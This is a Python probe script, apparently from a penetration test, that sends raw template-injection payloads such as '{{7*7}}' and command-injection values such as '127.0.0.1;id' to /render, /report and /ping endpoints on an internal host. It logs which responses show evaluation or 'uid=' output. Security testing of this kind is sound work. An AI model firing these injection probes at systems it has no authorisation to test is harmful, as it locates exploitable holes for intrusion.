#!/usr/bin/env python3
# INT-r27-0019/0018 follow-up: RAW (unencoded) payloads to close the
# "server echoes encoded string, never decodes" false-negative window.
import http.client, json, time

HOST, PORT = "svc-dashboard", 8006

def raw_request(path):
    return "GET %s HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n" % path

def get(path):
    c = http.client.HTTPConnection(HOST, PORT, timeout=6)
    try:
        c.request("GET", path)
        r = c.getresponse()
        body = r.read().decode("utf-8", "replace")
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        return r.status, hdrs, body
    finally:
        c.close()

SSTI = ["{{7*7}}", "${7*7}", "#{7*7}", "{{7*'7'}}"]
CMDI = ["127.0.0.1;id", "127.0.0.1|id"]

results = []
hits = []

# raw SSTI: render+report x tpl/name/template
for ep in ["/render", "/report"]:
    for p in ["tpl", "name", "template"]:
        for val in SSTI:
            path = "%s?%s=%s" % (ep, p, val)  # unencoded raw
            st, hd, bd = get(path)
            ev49 = "49" in bd
            ev7777777 = "7777777" in bd
            rec = {"case": "raw:%s:%s" % (ep, p), "payload": val,
                   "path": path, "raw_request": raw_request(path),
                   "status": st, "headers": hd, "body": bd[:600],
                   "body_len": len(bd), "eval_49": ev49,
                   "eval_7777777": ev7777777}
            results.append(rec)
            if ev49 or ev7777777:
                hits.append(rec["case"])
            time.sleep(0.3)

# raw CMDI: ping x 5 params x ;id / |id
for p in ["host", "cmd", "ip", "target", "q"]:
    for val in CMDI:
        path = "/ping?%s=%s" % (p, val)  # unencoded raw
        st, hd, bd = get(path)
        rec = {"case": "raw:ping:%s" % p, "payload": val,
               "path": path, "raw_request": raw_request(path),
               "status": st, "headers": hd, "body": bd[:600],
               "body_len": len(bd), "uid_present": "uid=" in bd,
               "body_is_baseline": "64 bytes from 127.0.0.1" in bd and len(bd) == 73}
        results.append(rec)
        if rec["uid_present"] or not rec["body_is_baseline"]:
            hits.append(rec["case"])
        time.sleep(0.3)

print(json.dumps({"target": "svc-dashboard:8006",
                  "intent": "INT-r27-0018+0019 followup raw",
                  "total_requests": len(results), "hits": hits,
                  "results": results}, ensure_ascii=False, indent=1))
